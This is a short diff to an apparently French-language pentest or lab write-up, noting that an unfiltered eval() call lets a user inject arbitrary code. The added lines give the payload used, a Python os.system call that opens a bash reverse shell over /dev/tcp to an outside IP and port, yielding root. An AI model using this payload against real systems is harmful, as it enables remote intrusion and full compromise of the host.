@@ -1103,3 +1103,5 @@ uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_serv
 ```
 
 La fonction vulnérable est donc ``eval()`` car il n'y a aucun filtre, l'utilisateur peut injecter n'importe quel payload.
+
+Ici le payload qu'on utilise est : ``__import__('os').system('bash -i >& /dev/tcp/172.27.206.51/4444 0>&1')`` afin d'avoir un reverse shell en tant que root.
